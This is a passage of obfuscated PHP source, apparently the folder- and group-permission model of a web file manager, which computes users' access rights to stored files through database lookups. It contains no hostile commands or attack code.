($·ö›©İ[$²Ã£ß©ñ[1542]]) { if ($·ö›©İ[$²Ã£ß©ñ[1542]] == $ÁÉ¡†øÃ) { $Ä°Ú²¸¤ = !0; break; } } if ($·ö›©İ[$²Ã£ß©ñ[1444]]) { if ($this->groupContainUser($·ö›©İ[$²Ã£ß©ñ[1444]], $ÁÉ¡†øÃ)) { $Ä°Ú²¸¤ = !0; break; } } } if ($Ä°Ú²¸¤) { $½ÁÑóè•[] = $’§ÛåËĞ; } $›ß­‘’– = $’§ÛåËĞ[$²Ã£ß©ñ[192]]; if (isset($ÑæßêÁù[$›ß­‘’–])) { $’§ÛåËĞ[$²Ã£ß©ñ[2331]][] = $ÑæßêÁù[$›ß­‘’–][0]; $ÑæßêÁù[$›ß­‘’–] = !1; } } $ÑæßêÁù = array_filter(array_values($ÑæßêÁù)); $½ÁÑóè• = array_merge($ÑæßêÁù, $½ÁÑóè•); return $½ÁÑóè•; } public function setAllChildrenByUser($§Ú¶Ü¼Í, $—ÍÙ¢„‹, $ŸĞô¹°À) { $âØ£ö”¥ =& $_SERVER[áäÒ½¯Ç]; $¿ÉÈ®ú¥ = $this->getAllChildrenByUser($§Ú¶Ü¼Í, $—ÍÙ¢„‹); if (!$ŸĞô¹°À || !$¿ÉÈ®ú¥) { return !1; } foreach ($¿ÉÈ®ú¥ as $ú·ü¬½ç) { $šØ²§… = array(); foreach ($ú·ü¬½ç[$âØ£ö”¥[2331]] as $‡ŠŒ§) { $˜£ˆïèÍ = $‡ŠŒ§[$âØ£ö”¥[561]]; $­„·ûõ = $‡ŠŒ§[$âØ£ö”¥[1542]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $ùíã‡š = $‡ŠŒ§[$âØ£ö”¥[1542]] ? $‡ŠŒ§[$âØ£ö”¥[1542]] : $‡ŠŒ§[$âØ£ö”¥[1444]]; if ($‡ŠŒ§[$âØ£ö”¥[1542]] && $‡ŠŒ§[$âØ£ö”¥[1542]] == $—ÍÙ¢„‹) { continue; } $šØ²§…[] = array($âØ£ö”¥[192] => $ú·ü¬½ç[$âØ£ö”¥[192]], $âØ£ö”¥[189] => $­„·ûõ, $âØ£ö”¥[594] => intval($ùíã‡š), $âØ£ö”¥[1589] => isset($˜£ˆïèÍ[$âØ£ö”¥[492]]) ? intval($˜£ˆïèÍ[$âØ£ö”¥[492]]) : 0, $âØ£ö”¥[2295] => isset($˜£ˆïèÍ[$âØ£ö”¥[2295]]) ? intval($˜£ˆïèÍ[$âØ£ö”¥[2295]]) : -1); } $šØ²§…[] = array($âØ£ö”¥[192] => $ú·ü¬½ç[$âØ£ö”¥[192]], $âØ£ö”¥[189] => SourceModel::TYPE_USER, $âØ£ö”¥[594] => intval($—ÍÙ¢„‹), $âØ£ö”¥[1589] => intval($ŸĞô¹°À), $âØ£ö”¥[2295] => -1); $this->where(array($âØ£ö”¥[511] => $ú·ü¬½ç[$âØ£ö”¥[192]]))->delete(); $this->addAll($šØ²§…); } return !0; } public function get($Ğ‡Ùø÷«) { $·‹èşøü = $this->getSourceList(array($Ğ‡Ùø÷«), !0); return $·‹èşøü[0]; } public function getSourceList($ûÕÖ¤ä, $Êõ²¤º = false, $¡ÌùÀ…È = false) { $õ¿úéñî =& $_SERVER[áäÒ½¯Ç]; if (!$ûÕÖ¤ä) { return array(); } $íŸÁÎ = Model($õ¿úéñî[1482]); if (!$Êõ²¤º && count($ûÕÖ¤ä) == 1) { $Êõ²¤º = array(); $Êõ²¤º[$ûÕÖ¤ä[0]] = $íŸÁÎ->sourceInfo($ûÕÖ¤ä[0]); } if (!$Êõ²¤º) { $‘¥­µ„ = array($õ¿úéñî[511] => array($õ¿úéñî[512], $ûÕÖ¤ä)); $Êõ²¤º = $íŸÁÎ->field($õ¿úéñî[2336])->where($‘¥­µ„)->select(); $Êõ²¤º = array_to_keyvalue($Êõ²¤º, $õ¿úéñî[192]); } $Åô“õ = $ûÕÖ¤ä; foreach ($Êõ²¤º as $ôÄİüê => $×Á‚ÃÕ) { $ìšÖ¸Ç¬ = $íŸÁÎ->parentLevelArray($×Á‚ÃÕ[$õ¿úéñî[609]]); $Åô“õ = array_merge($Åô“õ, array(intval($ôÄİüê)), array_reverse($ìšÖ¸Ç¬)); } $Åô“õ = array_values(array_unique($Åô“õ)); if (!$Åô“õ) { return array(); } $şşîŞÚ¦ = $this->sourceAuthSelect($Åô“õ); $ëĞïØ¸ = array(); foreach ($Åô“õ as $°€éî¶) { if (isset($şşîŞÚ¦[$°€éî¶])) { $ëĞïØ¸[$°€éî¶] = $şşîŞÚ¦[$°€éî¶]; } } $ğç°¢¤ú = $this->userIsRoot($¡ÌùÀ…È); $ÒõÙ›„ = AuthModel::authAll(); $é¢ãó§ì = array($õ¿úéñî[508] => $ÒõÙ›„, $õ¿úéñî[2337] => array($õ¿úéñî[513] => 0, $õ¿úéñî[2139] => $ÒõÙ›„, $õ¿úéñî[514] => LNG($õ¿úéñî[2318]), $õ¿úéñî[2154] => $õ¿úéñî[2319])); $¹’Ï²öõ = array(); foreach ($Êõ²¤º as $°€éî¶ => $…–Äº¶Ò) { if ($ğç°¢¤ú && $GLOBALS[$õ¿úéñî[6]][$õ¿úéñî[2152]]) { $¹’Ï²öõ[$°€éî¶] = $é¢ãó§ì; continue; } $¹’Ï²öõ[$°€éî¶] = $this->makeSourceAuth($…–Äº¶Ò, $ëĞïØ¸, $¡ÌùÀ…È); } return $¹’Ï²öõ; } public function authDeepCheck($ˆòå»€, $âœìª = false) { $ ƒîŠ Î =& $_SERVER[áäÒ½¯Ç]; $âœìª = $âœìª ? $âœìª : USER_ID; $ğ®ûÁ‹í = $this->makeAuthDeep($âœìª); if (!in_array($ˆòå»€, $ğ®ûÁ‹í[$ ƒîŠ Î[2338]])) { return !1; } $àĞ‚…ÕÎ = array(); foreach ($ğ®ûÁ‹í[$ ƒîŠ Î[2339]] as $¶øÄ÷ó => $’£§şßÜ) { if (!in_array($ˆòå»€, $’£§şßÜ)) { continue; } $àĞ‚…ÕÎ[] = $¶øÄ÷ó; } if (!$àĞ‚…ÕÎ) { return !1; } $ÚçÃØÓÆ = $àĞ‚…ÕÎ ? $àĞ‚…ÕÎ[0] : $ˆòå»€; return array($ ƒîŠ Î[508] => -1, $ ƒîŠ Î[561] => array($ ƒîŠ Î[513] => $ ƒîŠ Î[1326], $ ƒîŠ Î[2139] => $ ƒîŠ Î[239], $ ƒîŠ Î[514] => LNG($ ƒîŠ Î[2340]), $ ƒîŠ Î[2154] => $ ƒîŠ Î[2341]), $ ƒîŠ Î[2329] => LNG($ ƒîŠ Î[2342]), $ ƒîŠ Î[2343] => $this->sourceAuthInfo($ÚçÃØÓÆ)); } protected function makeAuthDeep($ô·ãÙÉØ = false) { $°­¿ıŸ¬ =& $_SERVER[áäÒ½¯Ç]; static $ÛŸÒ”ÌÓ = array(); $ô·ãÙÉØ = $ô·ãÙÉØ ? $ô·ãÙÉØ : USER_ID; if (isset($ÛŸÒ”ÌÓ[$ô·ãÙÉØ])) { return $ÛŸÒ”ÌÓ[$ô·ãÙÉØ]; } $‰Ã»²Ûß = Model($°­¿ıŸ¬[2344])->listData(); $Øè¡±Ö = array(); foreach ($‰Ã»²Ûß as $—ÖÌç€) { if ($—ÖÌç€[$°­¿ıŸ¬[507]] == 0 && $—ÖÌç€[$°­¿ıŸ¬[2153]] == $°­¿ıŸ¬[91]) { $Øè¡±Ö[] = $—ÖÌç€[$°­¿ıŸ¬[492]]; } } $ŸŸÛŞóî = $this->userGroupParents($ô·ãÙÉØ); $—Ï£Ä÷ = array($°­¿ıŸ¬[189] => SourceModel::TYPE_USER, $°­¿ıŸ¬[594] => $ô·ãÙÉØ); if ($ŸŸÛŞóî) { $—Ï£Ä÷ = array(array($°­¿ıŸ¬[189] => SourceModel::TYPE_USER, $°­¿ıŸ¬[594] => $ô·ãÙÉØ), array($°­¿ıŸ¬[189] => SourceModel::TYPE_GROUP, $°­¿ıŸ¬[594] => array($°­¿ıŸ¬[512], $ŸŸÛŞóî)), $°­¿ıŸ¬[1116] => $°­¿ıŸ¬[2233]); } $¦ñâƒßÙ = $this->field($°­¿ıŸ¬[2345])->where($—Ï£Ä÷)->select(); $øÈ¶¨Ø = array(); $ı•ìÏä = array_to_keyvalue_group($¦ñâƒßÙ, $°­¿ıŸ¬[192]); foreach ($ı•ìÏä as $Çİäüñâ => $½¿’†•) { $‰…£Èºİ = $this->authArrayCheck($½¿’†•, $ô·ãÙÉØ); if ($‰…£Èºİ[$°­¿ıŸ¬[508]] > 0) { $øÈ¶¨Ø[] = $Çİäüñâ . $°­¿ıŸ¬[12]; } } if ($ŸŸÛŞóî) { $¹†ä„á = Model($°­¿ıŸ¬[610]); foreach ($ŸŸÛŞóî as $¾Ø¨Î•¸) { $‘€‹íÎş = $¹†ä„á->getInfo($¾Ø¨Î•¸); if (!$‘€‹íÎş || !is_array($‘€‹íÎş[$°­¿ıŸ¬[90]])) { continue; } $øÈ¶¨Ø[] = $‘€‹íÎş[$°­¿ıŸ¬[90]][$°­¿ıŸ¬[192]]; } } $ÑŒìÁŠ‹ = array(); $êú„†Ê‚ = $ŸŸÛŞóî; $´ˆŒêÈ = Model($°­¿ıŸ¬[1482]); $¹†ä„á = Model($°­¿ıŸ¬[610]); $ì¤°ƒ¤ = array(); $û•§¢¢ö = array(); $ÑñŠÑæµ = array(); $Í¿´¶©å = array(); if ($øÈ¶¨Ø) { $ÙŸç‚äŠ = $´ˆŒêÈ->where(array($°­¿ıŸ¬[192] => array($°­¿ıŸ¬[512], $øÈ¶¨Ø)))->select(); foreach ($ÙŸç‚äŠ as $óÁ¡àìÛ) { if ($óÁ¡àìÛ[$°­¿ıŸ¬[525]] == $°­¿ıŸ¬[91]) { continue; } $ŒË†öØÆ = $´ˆŒêÈ->parentLevelArray($óÁ¡àìÛ[$°­¿ıŸ¬[609]]); $ÑŒìÁŠ‹ = array_merge($ÑŒìÁŠ‹, $ŒË†öØÆ); $êú„†Ê‚[] = $óÁ¡àìÛ[$°­¿ıŸ¬[594]]; $ì¤°ƒ¤[$óÁ¡àìÛ[$°­¿ıŸ¬[192]]] = $ŒË†öØÆ; $û•§¢¢ö[$óÁ¡àìÛ[$°­¿ıŸ¬[192]]] = $óÁ¡àìÛ[$°­¿ıŸ¬[594]]; } } $êú„†Ê‚ = array_values(array_unique($êú„†Ê‚)); $™úáĞÑ = $êú„†Ê‚; foreach ($™úáĞÑ as $¾Ø¨Î•¸) { $‘€‹íÎş = $¹†ä„á->getInfo($¾Ø¨Î•¸); $ŒË†öØÆ = $´ˆŒêÈ->parentLevelArray($‘€‹íÎş[$°­¿ıŸ¬[609]]); $êú„†Ê‚ = array_merge($êú„†Ê‚, $ŒË†öØÆ); } $êú„†Ê‚ = array_values(array_unique($êú„†Ê‚)); foreach ($êú„†Ê‚ as $¾Ø¨Î•¸) { $‘€‹íÎş = $¹†ä„á->getInfo($¾Ø¨Î•¸); $ÑŒìÁŠ‹[] = $‘€‹íÎş[$°­¿ıŸ¬[90]][$°­¿ıŸ¬[192]]; $ÑñŠÑæµ[$¾Ø¨Î•¸] = $‘€‹íÎş[$°­¿ıŸ¬[90]][$°­¿ıŸ¬[192]]; $Í¿´¶©å[$¾Ø¨Î•¸] = $´ˆŒêÈ->parentLevelArray($‘€‹íÎş[$°­¿ıŸ¬[609]]); } foreach ($ì¤°ƒ¤ as $®îŸâÍÔ => $Š÷µùä¥) { $µá³ğˆá = $û•§¢¢ö[$®îŸâÍÔ]; if (!$µá³ğˆá || !$ÑñŠÑæµ[$µá³ğˆá]) { continue; } $ş²‡À·¨ = array(); foreach ($Í¿´¶©å[$µá³ğˆá] as $¾Ø¨Î•¸) { $ş²‡À·¨[] = $ÑñŠÑæµ[$¾Ø¨Î•¸]; } $ì¤°ƒ¤[$®îŸâÍÔ] = array_merge($ş²‡À·¨, $Š÷µùä¥); } $ÑŒìÁŠ‹ = array_values(array_unique($ÑŒìÁŠ‹)); $›áÇ—§ß = array($°­¿ıŸ¬[2338] => $ÑŒìÁŠ‹, $°­¿ıŸ¬[2339] => $ì¤°ƒ¤); $ÛŸÒ”ÌÓ[$ô·ãÙÉØ] = $›áÇ—§ß; return $›áÇ—§ß; } private function makeSourceAuth($ºş”µ˜, $ùÓî–ı, $Ûè‹Ë£¥ = false) { $Çœ»ı€ =& $_SERVER[áäÒ½¯Ç]; $œØé»â = $Çœ»ı€[91]; $°Ñ¼¬Ï = $ºş”µ˜[$Çœ»ı€[594]]; $ÏÎğÙ©Ì = $ºş”µ˜[$Çœ»ı€[189]] == SourceModel::TYPE_GROUP; $©›ÛäŞî = $ÏÎğÙ©Ì ? $this->groupRootAuth($°Ñ¼¬Ï, $Ûè‹Ë£¥) : !1; if ($©›ÛäŞî && Model($Çœ»ı€[596])->authCheckAction($©›ÛäŞî[$Çœ»ı€[507]], $Çœ»ı€[1514])) { return $this->groupAuthInfo($©›ÛäŞî, $°Ñ¼¬Ï); } $Ø™­üãŸ = Model($Çœ»ı€[1482])->parentLevelArray($ºş”µ˜[$Çœ»ı€[609]]); $Ø™­üãŸ = array_merge(array($ºş”µ˜[$Çœ»ı€[192]]), array_reverse($Ø™­üãŸ)); $¤™ì™ØÆ = !1; foreach ($Ø™­üãŸ as $ã¼Ä…›ê) { if (!isset($ùÓî–ı[$ã¼Ä…›ê])) { continue; } $«ÙıŸ…¯ = $this->authMake($ùÓî–ı[$ã¼Ä…›ê], $Ûè‹Ë£¥); if ($«ÙıŸ…¯[$Çœ»ı€[561]]) { $¤™ì™ØÆ = $«ÙıŸ…¯; break; } } if (!$ÏÎğÙ©Ì) { return $¤™ì™ØÆ; } if (!$¤™ì™ØÆ && $©›ÛäŞî) { $¤™ì™ØÆ = $this->groupAuthInfo($©›ÛäŞî, $°Ñ¼¬Ï); } if (!$¤™ì™ØÆ) { $‹‡Š¦å = Model($Çœ»ı€[610])->getInfo($°Ñ¼¬Ï); $•Æú£­ù = explode($Çœ»ı€[50], trim($‹‡Š¦å[$Çœ»ı€[609]], $Çœ»ı€[50])); $•Æú£­ù = array_reverse($•Æú£­ù); foreach ($•Æú£­ù as $‹“øúã) { if ($‹“øúã == $Çœ»ı€[239] || $‹“øúã == $œØé»â) { continue; } $³¶»Š¸É = $this->groupRootAuth($‹“øúã, $Ûè‹Ë£¥); if (!$³¶»Š¸É) { continue; } $¤™ì™ØÆ = $this->groupAuthInfo($³¶»Š¸É, $‹“øúã); break; } } if (!$¤™ì™ØÆ || $¤™ì™ØÆ[$Çœ»ı€[508]] <= 0) { $¬¯€´ı° = $this->authDeepCheck($ºş”µ˜[$Çœ»ı€[192]], $Ûè‹Ë£¥); if ($¬¯€´ı°) { $¤™ì™ØÆ = $¬¯€´ı°; } } return $¤™ì™ØÆ; } private function userIsRoot($†¢Œˆïª = false) { $Âƒ€®¡¢ =& $_SERVER[áäÒ½¯Ç]; if (!$†¢Œˆïª && KodUser::isRoot()) { return !0; } $¼şÒ¸£ = Model($Âƒ€®¡¢[622])->getInfo($†¢Œˆïª); $ôË¾±Á° = Model($Âƒ€®¡¢[2322])->listData($¼şÒ¸£[$Âƒ€®¡¢[2323]]); if ($ôË¾±Á° && $ôË¾±Á°[$Âƒ€®¡¢[600]][$Âƒ€®¡¢[2326]] == 1) { return !0; } return !1; } private function sourceAuthInfo($¨ıØã¹) { $ˆ¯¬Ç¸ =& $_SERVER[áäÒ½¯Ç]; $èæø‹àœ = Model($ˆ¯¬Ç¸[1482]); $øÚáëÇ = $èæø‹àœ->sourceInfo($¨ıØã¹); if (!$øÚáëÇ) { return !1; } $èæø‹àœ->groupPathDisplay($øÚáëÇ); $¡ıµÚæ = array($øÚáëÇ); $¡ıµÚæ = $èæø‹àœ->_listAppendPath($¡ıµÚæ, !1); $øÚáëÇ = $¡ıµÚæ[0]; $Ìü—² = $øÚáëÇ[$ˆ¯¬Ç¸[607]]; if (isset($øÚáëÇ[$ˆ¯¬Ç¸[615]])) { $İÎ¾ùú« = explode($ˆ¯¬Ç¸[8], trim($øÚáëÇ[$ˆ¯¬Ç¸[607]], $ˆ¯¬Ç¸[8])); array_shift($İÎ¾ùú«); $Ìü—² = $øÚáëÇ[$ˆ¯¬Ç¸[613]] . $ˆ¯¬Ç¸[2346] . implode($ˆ¯¬Ç¸[8], $İÎ¾ùú«); } return array($ˆ¯¬Ç¸[32] => $øÚáëÇ[$ˆ¯¬Ç¸[32]], $ˆ¯¬Ç¸[192] => $øÚáëÇ[$ˆ¯¬Ç¸[192]], $ˆ¯¬Ç¸[87] => KodIO::make($øÚáëÇ[$ˆ¯¬Ç¸[192]]), $ˆ¯¬Ç¸[607] => $Ìü—²); } private function groupAuthInfo($ÌıçßÎé, $ìÒ§ƒÜç) { $××üÍÓ§ =& $_SERVER[áäÒ½¯Ç]; $áª€Â¡˜ = Model($××üÍÓ§[610])->getInfo($ìÒ§ƒÜç); return array($××üÍÓ§[2347] => intval($ÌıçßÎé[$××üÍÓ§[507]]), $××üÍÓ§[2337] => $ÌıçßÎé, $××üÍÓ§[2348] => LNG($××üÍÓ§[2349]), $××üÍÓ§[2343] => array($××üÍÓ§[514] => $áª€Â¡˜[$××üÍÓ§[32]], $××üÍÓ§[87] => KodIO::make($áª€Â¡˜[$××üÍÓ§[90]][$××üÍÓ§[192]]), $××üÍÓ§[2350] => $áª€Â¡˜[$××üÍÓ§[614]])); } protected function groupRootAuth($­£Ü©È, $ô‹ïóÔ™ = false) { $ò½«™» =& $_SERVER[áäÒ½¯Ç]; $ô‹ïóÔ™ = $ô‹ïóÔ™ ? $ô‹ïóÔ™ : USER_ID; $õ¶«Âõ = $ô‹ïóÔ™ . $ò½«™»[2351] . $­£Ü©È; static $¡¿à¢”¹ = array(); if (isset($¡¿à¢”¹[$õ¶«Âõ])) { return $¡¿à¢”¹[$õ¶«Âõ]; } $ô÷–¬Õ = Model($ò½«™»[610])->getInfo($­£Ü©È); $–ñÙ¹è = $this->userGroupList($ô‹ïóÔ™); $÷Óô¯˜ = isset($–ñÙ¹è[$­£Ü©È]) ? $–ñÙ¹è[$­£Ü©È][$ò½«™»[507]] : !1; if ($÷Óô¯˜ && Model($ò½«™»[596])->authCheckAction($÷Óô¯˜[$ò½«™»[507]], $ò½«™»[1514])) { $¡¿à¢”¹[$õ¶«Âõ] = $÷Óô¯˜; return $÷Óô¯˜; } $ò¹±İ¶’ = $this->sourceAuthSelect($ô÷–¬Õ[$ò½«™»[90]][$ò½«™»[192]]); $¥ÈØ„´³ = $ò¹±İ¶’ ? $this->authMake($ò¹±İ¶’, $ô‹ïóÔ™) : !1; $˜ïË‹†Å = $¥ÈØ„´³ ? $¥ÈØ„´³[$ò½«™»[561]] : !1; $¡¿à¢”¹[$õ¶«Âõ] = $˜ïË‹†Å ? $˜ïË‹†Å : $÷Óô¯˜; return $¡¿à¢”¹[$õ¶«Âõ]; } public function authOwnerApply($˜‡¼‘õÉ) { $¹ßÃÏÆ =& $_SERVER[áäÒ½¯Ç]; if (empty($˜‡¼‘õÉ[$¹ßÃÏÆ[507]]) || isset($˜‡¼‘õÉ[$¹ßÃÏÆ[1533]]) && $˜‡¼‘õÉ[$¹ßÃÏÆ[1533]]) { return $˜‡¼‘õÉ; } if (AuthModel::authCheckRoot($˜‡¼‘õÉ[$¹ßÃÏÆ[507]][$¹ßÃÏÆ[508]])) { return $˜‡¼‘õÉ; } $„‰Ø¼³ = Model($¹ßÃÏÆ[1482])->parentLevelArray($˜‡¼‘õÉ[$¹ßÃÏÆ[609]]); $„‰Ø¼³ = array_merge(array($˜‡¼‘õÉ[$¹ßÃÏÆ[192]]), array_reverse($„‰Ø¼³)); $ìİõ‚Š = $this->sourceAuthSelect($„‰Ø¼³); $ºÕƒøõ = array(); $¤”îç¨‚ = array(); foreach ($ìİõ‚Š as $„¾õğ™µ => $‚ŸáÄ) { $‰½ ¥Æ = $this->authFolderOwnerUser($‚ŸáÄ); $ºÕƒøõ[$„¾õğ™µ] = $‰½ ¥Æ; $¤”îç¨‚ = array_merge($¤”îç¨‚, $‰½ ¥Æ[$¹ßÃÏÆ[690]]); if ($‰½ ¥Æ[$¹ßÃÏÆ[2352]]) { break; } } if (count($¤”îç¨‚) == 0) { $¤”îç¨‚ = $this->authFolderOwnerGroup($˜‡¼‘õÉ[$¹ßÃÏÆ[594]]); } $¤”îç¨‚ = array_unique($¤”îç¨‚); if (AuthModel::authCheckRoot($˜‡¼‘õÉ[$¹ßÃÏÆ[507]][$¹ßÃÏÆ[508]])) { $¤”îç¨‚[] = USER_ID; } $˜‡¼‘õÉ[$¹ßÃÏÆ[507]][$¹ßÃÏÆ[2353]] = Model($¹ßÃÏÆ[602])->userListInfo($¤”îç¨‚); return $˜‡¼‘õÉ; } private function authFolderOwnerGroup($é©™ÈÂ„) { $ûë©³û” =& $_SERVER[áäÒ½¯Ç]; $†»©ƒ¬Æ = Model($ûë©³û”[2225])->where(array($ûë©³û”[1444] => $é©™ÈÂ„))->select(); $Ûá˜Ş‡¹ = array(); if (!$†»©ƒ¬Æ) { return $Ûá˜Ş‡¹; } foreach ($†»©ƒ¬Æ as $•¼É¢Şè) { $Êã¬Úà = $this->authInfo($•¼É¢Şè); if (AuthModel::authCheckRoot($Êã¬Úà[$ûë©³û”[507]])) { $Ûá˜Ş‡¹[] = $•¼É¢Şè[$ûë©³û”[1542]]; } } return $Ûá˜Ş‡¹; } private function authFolderOwnerUser($’¾û­„) { $Ÿ‰Æ×‘ú =& $_SERVER[áäÒ½¯Ç]; $ùñ—éŞƒ = array(); $Ø¸¨Ğ¡± = !1; foreach ($’¾û­„ as $•›¯ üİ) { $õ÷Å•— = $this->authInfo($•›¯ üİ); if ($•›¯ üİ[$Ÿ‰Æ×‘ú[594]] == $Ÿ‰Æ×‘ú[239]) { $Ø¸¨Ğ¡± = !0; } if ($•›¯ üİ[$Ÿ‰Æ×‘ú[189]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($õ÷Å•—[$Ÿ‰Æ×‘ú[507]])) { $ùñ—éŞƒ[] = $•›¯ üİ[$Ÿ‰Æ×‘ú[594]]; } } } return array($Ÿ‰Æ×‘ú[690] => $ùñ—éŞƒ, $Ÿ‰Æ×‘ú[2352] => $Ø¸¨Ğ¡±); } public function authMake($Ÿ“ŒÉ¨, $˜ÕÎ»ì› = false) { $†®²ìÀ¥ =& $_SERVER[áäÒ½¯Ç]; $³û«’ü = $this->authArrayCheck($Ÿ“ŒÉ¨, $˜ÕÎ»ì›); if ($³û«’ü[$†®²ìÀ¥[2333]]) { $³û«’ü[$†®²ìÀ¥[2333]] = $this->sourceAuthInfo($³û«’ü[$†®²ìÀ¥[2333]]); } return $³û«’ü; } public function authArrayCheck($ƒòîïÆË, $‘„½ÎÁ‚ = false) { $›œÛœËÅ =& $_SERVER[áäÒ½¯Ç]; if (!$ƒòîïÆË) { return array($›œÛœËÅ[508] => 0, $›œÛœËÅ[561] => !1, $›œÛœËÅ[2348] => $›œÛœËÅ[12]); } $‘„½ÎÁ‚ = $‘„½ÎÁ‚ ? $‘„½ÎÁ‚ : USER_ID; $¯º‹ÛäÔ = 0; $¶™ğ³Ãİ = 0; $ò‹ØÌñ = 0; $ÙÓÂÖì— = 0; $•ú©™Õ = 0; $ç‰ò—¢æ = 0; $»™¼Åß¦ = 0; $ôª•Ğ¤² = 0; $€¼áÙ‹ = 1000; $äÑš¹ŠÍ = 0; $·î¿Ô½¹ = 0; $á’™îÄ = 0; $‰¡áÆ“Ö = 0; $ßˆé‡ = 0; foreach ($ƒòîïÆË as $ØğââŠ) { $‡Ğ€áö = $this->authInfo($ØğââŠ); if (!$‡Ğ€áö) { continue; } $€Ù°ôŒ = $ØğââŠ[$›œÛœËÅ[594]]; $‡íˆ§˜ = $ØğââŠ[$›œÛœËÅ[192]]; $ÉåØÎ•Ú = intval($‡Ğ€áö[$›œÛœËÅ[507]]); if ($ØğââŠ[$›œÛœËÅ[189]] == SourceModel::TYPE_USER && $€Ù°ôŒ == $‘„½ÎÁ‚) { $¯º‹ÛäÔ = !0; $ò‹ØÌñ = $‡Ğ€áö; $¶™ğ³Ãİ = $ÉåØÎ•Ú; $ÙÓÂÖì— = $‡íˆ§˜; } else { if ($ØğââŠ[$›œÛœËÅ[189]] == SourceModel::TYPE_GROUP && $this->groupContainUser($€Ù°ôŒ, $‘„½ÎÁ‚)) { $•ú©™Õ = !0; $•‰Šª›Ô = $this->groupStepToUserGroup($€Ù°ôŒ, $‘„½ÎÁ‚); if ($•‰Šª›Ô < $€¼áÙ‹) { $€¼áÙ‹ = $•‰Šª›Ô; $ç‰ò—¢æ = $ÉåØÎ•Ú; $»™¼Åß¦ = $‡Ğ€áö; $äÑš¹ŠÍ = $€Ù°ôŒ; $ôª•Ğ¤² = $‡íˆ§˜; } if ($•‰Šª›Ô == $€¼áÙ‹ && $ÉåØÎ•Ú >= $ç‰ò—¢æ) { $ç‰ò—¢æ = $ÉåØÎ•Ú; $»™¼Åß¦ = $‡Ğ€áö; $äÑš¹ŠÍ = $€Ù°ôŒ; $ôª•Ğ¤² = $‡íˆ§˜; } } else { if (!$€Ù°ôŒ || $€Ù°ôŒ == $›œÛœËÅ[239]) { $·î¿Ô½¹ = !0; $‰¡áÆ“Ö = $‡Ğ€áö; $á’™îÄ = $ÉåØÎ•Ú; $ßˆé‡ = $‡íˆ§˜; } } } } if ($¯º‹ÛäÔ) { $“œ·ğ˜¥ = $¶™ğ³Ãİ; $‡Ğ€áö = $ò‹ØÌñ; $Ö°ì½ÄÚ = $ÙÓÂÖì—; $ÇœáÂòü = LNG($›œÛœËÅ[2354]); } else { if ($•ú©™Õ) { $“œ·ğ˜¥ = $ç‰ò—¢æ; $‡Ğ€áö = $»™¼Åß¦; $Ö°ì½ÄÚ = $ôª•Ğ¤²; $«Ç¿çÅÛ = Model($›œÛœËÅ[610])->getInfo($äÑš¹ŠÍ); $ÇœáÂòü = $›œÛœËÅ[174] . $«Ç¿çÅÛ[$›œÛœËÅ[614]] . $›œÛœËÅ[2355] . LNG($›œÛœËÅ[2356]); } else { if ($·î¿Ô½¹) { $“œ·ğ˜¥ = $á’™îÄ; $‡Ğ€áö = $‰¡áÆ“Ö; $Ö°ì½ÄÚ = $ßˆé‡; $ÇœáÂòü = LNG($›œÛœËÅ[2335]); } else { $“œ·ğ˜¥ = 0; $‡Ğ€áö = !1; $ÇœáÂòü = $›œÛœËÅ[12]; $Ö°ì½ÄÚ = $›œÛœËÅ[12]; } } } $ùôë‚ = array($›œÛœËÅ[2347] => intval($“œ·ğ˜¥), $›œÛœËÅ[2337] => $‡Ğ€áö, $›œÛœËÅ[2348] => $ÇœáÂòü, $›œÛœËÅ[2343] => $Ö°ì½ÄÚ); return $ùôë‚; } private function groupContainUser($½¸£‘ïÂ, $æ±§ç¡‚ = false) { return in_array($½¸£‘ïÂ, $this->userGroupParents($æ±§ç¡‚)); } private function groupStepToUserGroup($ã²§ïî, $Ôè—‚Öø = false) { $ñåñ£·… =& $_SERVER[áäÒ½¯Ç]; $Å«“ÏÊ§ = $this->userGroupList($Ôè—‚Öø); $¸şä“î“ = 1000; $Æü×Ñ•­ = $GLOBALS[$ñåñ£·…[6]][$ñåñ£·…[92]][$ñåñ£·…[2238]] == 1; $†•Ù»êë = $Æü×Ñ•­ ? 3 : 2; foreach ($Å«“ÏÊ§ as $¦¸Šüµ¯) { if ($¦¸Šüµ¯[$ñåñ£·…[1444]] == $ã²§ïî) { return 0; } $¼·¾Æ¡´ = explode($ñåñ£·…[50], trim($¦¸Šüµ¯[$ñåñ£·…[609]], $ñåñ£·…[50])); if ($¼·¾Æ¡´[0] == $ñåñ£·…[239] && count($¼·¾Æ¡´) > $†•Ù»êë) { $ªÀ–ÖÔø = array_reverse(array_slice($¼·¾Æ¡´, $†•Ù»êë)); $Œƒşæ¶ò = array_search($ã²§ïî, $ªÀ–ÖÔø); if ($Œƒşæ¶ò !== !1 && $Œƒşæ¶ò + 1 <= $¸şä“î“) { $¸şä“î“ = $Œƒşæ¶ò + 1; } } } return $¸şä“î“; } private function userGroupList($àÎ¥ôÁá = false, $ËËöÄ€ = false) { $÷şôé‰ =& $_SERVER[áäÒ½¯Ç]; static $Â×«êªÅ = array(); if (isset($Â×«êªÅ[$àÎ¥ôÁá])) { return $Â×«êªÅ[$àÎ¥ôÁá]; } if (!$ËËöÄ€) { $ËËöÄ€ = Model($÷şôé‰[622])->getInfo($àÎ¥ôÁá); } $Â×«êªÅ[$àÎ¥ôÁá] = array_to_keyvalue($ËËöÄ€[$÷şôé‰[1443]], $÷şôé‰[1444]); return $Â×«êªÅ[$àÎ¥ôÁá]; } public function userGroupParents($Å¾šûÆâ) { $¬’ù”Í‰ =& $_SERVER[áäÒ½¯Ç]; static $Îó‹“Õò = array(); $Å¾šûÆâ = $Å¾šûÆâ ? $Å¾šûÆâ : USER_ID; if (isset($Îó‹“Õò[$Å¾šûÆâ])) { return $Îó‹“Õò[$Å¾šûÆâ]; } $æÖ‹şºë = $this->userGroupList($Å¾šûÆâ); $÷½Áíî = array(); $êŠøª¡ = $GLOBALS[$¬’ù”Í‰[6]][$¬’ù”Í‰[92]][$¬’ù”Í‰[2238]] == 1; $«—†³ã£ = $êŠøª¡ ? 3 : 2; foreach ($æÖ‹şºë as $Ê‹‹âÌ) { $†‡ÆÂÑ = array($Ê‹‹âÌ[$¬’ù”Í‰[1444]]); $ñÕß¨³Ç = explode($¬’ù”Í‰[50], trim($Ê‹‹âÌ[$¬’ù”Í‰[609]], $¬’ù”Í‰[50])); if ($ñÕß¨³Ç[0] == $¬’ù”Í‰[239] && count($ñÕß¨³Ç) > $«—†³ã£) { $²ãâş¬š = array_slice($ñÕß¨³Ç, 